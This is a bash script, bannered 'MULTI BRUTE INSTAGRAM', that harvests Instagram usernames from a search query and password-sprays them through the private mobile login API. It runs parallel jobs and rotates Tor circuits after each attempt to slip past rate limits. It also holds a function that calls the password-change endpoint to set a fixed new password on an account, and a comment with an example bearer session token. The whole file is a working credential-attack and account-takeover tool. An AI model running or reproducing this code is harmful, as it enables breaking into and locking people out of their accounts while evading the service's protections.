#!/usr/bin/env bash
### IMPORT ###
source "$( cd "${BASH_SOURCE[0]%/*}" && pwd )/lib/oo-bootstrap.sh"
### MAIN ###
import util/namedParameters util/class
import String/UUID
import util/log util/exception util/tryCatch
import util/variable
import util/type
############ Bash InfinitY ##################
#https://github.com/niieani/bash-oo-framework"
#############################gfeqkwfgfjv################
trap ctrl_c INT

ctrl_c() {
        echo "Ctrl + C happen"
        rm -rf u.txt
        exit
}
class:Manjur() {
  public string name
  public integer height
}
  Manjur.__getter__() {
         cok=("cok.txt")
         if [[ -f cok.txt ]]; then
              printf ""
        else
              exit
         fi
         command -v tput > /dev/null 2>&1 || { echo >&2 "it's not installed. apt-get install ncurses-utils"; exit ; }
         command -v tor > /dev/null 2>&1 || { echo >&2 "it's not installed. apt-get install tor"; exit ; }
         this kita
        echo -e "
        $(UI.Color.Dim)███╗   ███╗██████╗ ██╗ ██████╗ 
        ████╗ ████║██╔══██╗██║██╔════╝ 
        $(UI.Color.LightCyan)██╔████╔██║██████╔╝██║██║  ███╗
        ██║╚██╔╝██║██╔══██╗██║██║   ██║
$(UI.Color.Magenta)        ██║ ╚═╝ ██║██████╔╝██║╚██████╔╝
$(UI.Color.Default)        ╚═╝     ╚═╝╚═════╝ ╚═╝ ╚═════╝ 
          [ MULTI BRUTE INSTAGRAM ]
$(UI.Color.Bold)          [ CREATED BY WIDHISEC   ]

        "
try {
    echo -ne "$(UI.Color.DarkGray)[?] NAme :"; read lolllz
    this getUs
    echo -ne "$(UI.Color.DarkGray)[?] WHat use the password : ";read psss
 (
        for lst_user in $(cat u.txt);do
        this okee &
        while (( $(jobs | wc -l) >= ${LIMIT} )); do
        sleep 0.1
        jobs > /dev/null
    done
    done
        wait
 )
 } catch {
    echo "The hard disk is not connected properly!"
    echo "Caught Exception:$(UI.Color.Red) $__BACKTRACE_COMMAND__ $(UI.Color.Default)"
    echo "File: $__BACKTRACE_SOURCE__, Line: $__BACKTRACE_LINE__"

    ## printing a caught exception couldn't be simpler, as it's stored in "${__EXCEPTION__[@]}"
    Exception::PrintException "${__EXCEPTION__[@]}"
}
rm -rf u.txt
        # --proxy socks5h://localhost:9050
        return 
        
  }
  Manjur.gaskeun(){
    curl -D - -s -k -X $'POST' \
    -H $'User-Agent: Instagram 265.0.0.19.301 Android (28/9; 240dpi; 720x1280; OnePlus; ONEPLUS A5000; OnePlus5; qcom; en_US)' \
   --data-urlencode "enc_password=#PWD_INSTAGRAM_BROWSER:0:$(this height):${psss}"\
   --data-urlencode "username=${lst_user}" \
   --data-urlencode "device_id=android-$(echo $(String::GenerateUUID))" \
   --data-urlencode "login_attempt_count=0"  \
    $'https://i.instagram.com/api/v1/accounts/login/' 


  }
  Manjur.asuy(){
               echo -e "$(UI.Color.Red)[!] $(UI.Color.Default)please turn it on TOR Connection\n"

 
 }
  Manjur.okee(){
    # this getUs
   #  local pars_igt=$(echo -e $(this gaskeun) )
     local MESAG=$(echo -e "$(this gaskeun)"| grep -oP '(?<=message":")[^"]*')
     local USER_ui=$(echo -e "$(this gaskeun)"|grep -oP '(?<="strong_id__":")[^"]*')
     if [[ $MESAG =~ "true" ]]; then
              echo -e "$(UI.Color.Green)[+] $(UI.Color.Default)[I GOT IT SUCCES]  \n"
              echo -e "$(UI.Color.Green)[+] $(UI.Color.Default)USERid -> ${USER_ui}  \n"
              killall -HUP tor
     elif [[ $MESAG =~ "The password you entered is incorrect. Please try again." ]]; then
                 echo -e "$(UI.Color.Red)[!] $(UI.Color.Default)WRONG_PASSWORD ${lst_user}|${psss}\n"
                 killall -HUP tor
         elif [[ $MESAG =~ "challenge_required" ]]; then
                 echo -e "$(UI.Color.LightYellow)[!] checkpoint_required ${lst_user}|${psss}"
                 killall -HUP tor
         elif [[ $MESAG =~ "Please wait a few minutes before trying again. " ]]; then
               echo -e "${RED}[-] TRYING ${CYAN}AGAIN. ${lst_user}|${psss}"
               killall -HUP tor
         elif [[ $MESAG =~ "The username you entered doesn't appear to belong to an account. Please check your username and try again." ]]; then
             echo -e "$(UI.Color.Red)[-] FAILED bf ${lst_user}|${psss}"
             killall -HUP tor
         else
             echo -e "unkown"
             killall -HUP tor
        fi
     #    # elif [[ $MESAG =~ "" ]]; then
     #     #     echo -e "$(UI.Color.Red)[-] FAILED bf ${lst_user}|${psss}"
     #     #     killall -HUP tor
     #     # else
     #     #     echo -e "unkown"
     #     #     killall -HUP tor
     #     # fi

  }
  Manjur.kita(){
       [string] c_k
      local c_k=$(curl --socks5-hostname localhost:9050 -s https://check.torproject.org/ > /dev/null; echo $?)
      if [[ $c_k -gt 0 ]]; then
         this asuy
      fi
      
  }
  Manjur.CagWEti(){
  # example Bearer IGT:2:eyJkc191c2VyX2lkIjoiMjI5NTI0NzE2MzEiLCJzZXNzaW9uaWQiOiIyMjk1MjQ3MTYzMSUzQTR3VGF0ajBRSUxFRGw2JTNBMTklM0FBWWZlZm9WVDJnVXVHRVNzNHNTSHZjckpfbkRvREh4Y3RUSkd2NGhhZ3cifQ==
      curl -s -k -X $'POST' \
    -H $'Host: i.instagram.com' \
    -H $'X-Ig-App-Locale: in_ID' \
    -H $'X-Ig-Device-Locale: en_US' \
    -H $'X-Ig-Mapped-Locale: id_ID' \
    -H $'User-Agent: Instagram 265.0.0.19.301 Android (28/9; 240dpi; 720x1280; OnePlus; ONEPLUS A5000; OnePlus5; qcom; en_US)' \
    -H $'Accept-Language: id-ID' \
    -H $'Authorization: '  \
     --data-urlencode "enc_old_password=#PWD_INSTAGRAM_BROWSER:0:$(this height):${psss}" \
     --data-urlencode "enc_new_password1=#PWD_INSTAGRAM_BROWSER:0:$(this height):jfeofijeoifjewfjj" \
     --data-urlencode "enc_new_password2=#PWD_INSTAGRAM_BROWSER:0:$(this height):jfeofijeoifjewfjj" \
    $'https://i.instagram.com/api/v1/accounts/change_password/'
  }
  Manjur.getUs(){
    touch u.txt
   curl -s -X GET "https://www.instagram.com/api/v1/web/search/topsearch/?context=blended&query=${lolllz}&include_reel=true&search_surface=web_top_search" \
  -H 'authority: www.instagram.com' \
  -H 'accept: */*' \
  -H 'accept-language: id,en;q=0.9' \
  -H 'referer: https://www.instagram.com/explore/' \
  -H 'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36 Edg/113.0.1774.42' \
  -H 'x-requested-with: XMLHttpRequest' \
  --compressed -b $cok|grep -Po '(?<="username":").*?(?=")'|sort -u >> u.txt
  }
  
LIMIT="15"
Type::Initialize Manjur
Manjur oke
$var:oke height = $(date +%s%N|cut -b1-13)
$var:oke

